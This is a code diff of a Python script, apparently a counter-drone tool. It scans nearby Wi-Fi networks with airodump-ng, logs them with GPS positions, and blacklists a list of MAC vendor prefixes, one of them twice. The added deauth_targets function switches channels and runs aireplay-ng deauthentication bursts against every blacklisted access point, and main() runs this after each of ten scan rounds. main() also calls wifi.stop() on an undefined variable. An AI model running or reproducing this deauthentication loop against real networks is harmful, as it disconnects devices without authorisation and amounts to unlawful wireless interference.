@@ -2,8 +2,10 @@
 import logging
 import argparse
 import time
+from subprocess import call
 from netdevdb import NetdevDb #Abstraction layer for db connectivity
 from pyrcrack.scanning import Airodump
+from pyrcrack.replaying import Aireplay
 import serial # For GPS
 from pynmea import nmea
 
@@ -44,22 +46,23 @@ def init():
         logger.addHandler(fh)
         logging.debug("started logging to file")
 
-def scan(netdb):
+def scan(netdb, interface):
     """
     Scan: Runs airodump-ng to characterize the environment.
     Returns: [string] containing the detected MAC addresses
     """
+
     # Setup the wireless interface to listen on
-    interface = 'wlp3s0' #Change this for the pi to something like wlan0
-    logging.debug("started scan")
     wifi = Airodump(interface)
-    wifi.start()
+    wifi.start()    
     scanres = wifi.tree
     logging.debug("Got tree")
     #Now add access points to db
     #Get gps data
-    gpsdata = getlocation('/dev/ttyUSB0') #Change this to the GPS port
+    gpsdata = getlocation('/dev/ttyUSB1') #Change this to the GPS port
 
+    #mark devices inactive
+    netdb.mark_inactive()
     for bssid in wifi.tree:
         netdb.adddevice(bssid, wifi.tree[bssid]['ESSID'], wifi.tree[bssid]['Power'], 
             wifi.tree[bssid]['channel'], wifi.tree[bssid]['Privacy'])
@@ -92,14 +95,23 @@ def refine_targets(networks):
     return []
 
 
-def deauth_targets(attack_pairs):
+def deauth_targets(netdb, wifi):
     """
     Detauth Targets: Performs a replay attack against the listed targets
     Input: [(string,int)] with the (MAC,channel) to target
     """
     logging.debug("deauth targets")
+    
+    #Get BSSIDs that match blacklist
+    attack_pairs = netdb.get_blacklisted()
     logging.debug(attack_pairs)
-    pass
+    for bssid in attack_pairs:
+        channel = str(bssid['channel'])
+        logging.debug("Blacklisting: " + bssid['bssid']  + " on channel " + channel)
+        #Set channel on device
+        call(["iwconfig",  wifi, "channel", channel])
+        call(["aireplay-ng", "-0", "10", "-a", bssid['bssid'], wifi])
+    logging.debug("Dauth targets completed")
 
 def getlocation(gpsdevice): #Pass in gps interface
     #Get current location and return it as a key pair
@@ -119,7 +131,7 @@ def getlocation(gpsdevice): #Pass in gps interface
             g.parse(gpstext)
             gpsdata = {'latitude':g.latitude, 'longitude': g.longitude, 'timestamp':g.timestamp, 'altitude':g.antenna_altitude}
         else:
-            print("GPS Text was: " + gpstext[3:8])
+            logging.debug("GPS Text was: " + gpstext[3:8])
     return gpsdata
 
 def main():
@@ -137,19 +149,35 @@ def main():
 
     #Setup database
     netdb = NetdevDb("c-uas") #Change this to the db name you wish to save things to.
+    #Blacklist
+    netdb.blacklist('A0:14:3D:00:00:00')
+    netdb.blacklist('60:60:1F:00:00:00')
+    netdb.blacklist('F4:DD:9E:00:00:00')
+    netdb.blacklist('D8:96:85:00:00:00')
+    netdb.blacklist('D4:D9:19:00:00:00')
+    netdb.blacklist('04:41:69:00:00:00')
+    netdb.blacklist('A0:14:3D:00:00:00')
+    netdb.blacklist('90:3A:E6:00:00:00')
+    netdb.blacklist('90:03:B7:00:00:00')
+    netdb.blacklist('00:26:7E:00:00:00')
+    netdb.blacklist('00:12:1C:00:00:00')
+    interface = 'wlp0s20u3' #'wlp3s0' #Change this for the pi to something like wlan0
+    logging.debug("started scan")
+    
 
     #while True:
-    for i in range(2):
-        networks = scan(netdb)
+    for i in range(10):
+        networks = scan(netdb, interface)
         print ("scan complete")
-        
         netdb.deviceswithlocations() #Show what was scanned
-        time.sleep(15)
+        deauth_targets(netdb, "wlp3s0")
+        #time.sleep(15)
         #targets = select_targets(networks)
         #if len(targets) > 0:
         #    attack_pairs = refine_targets(targets)
         #    deauth_targets(attack_pairs)
-
+    logging.debug("Completed")
+    wifi.stop()
 
 if __name__ == "__main__":
     main()
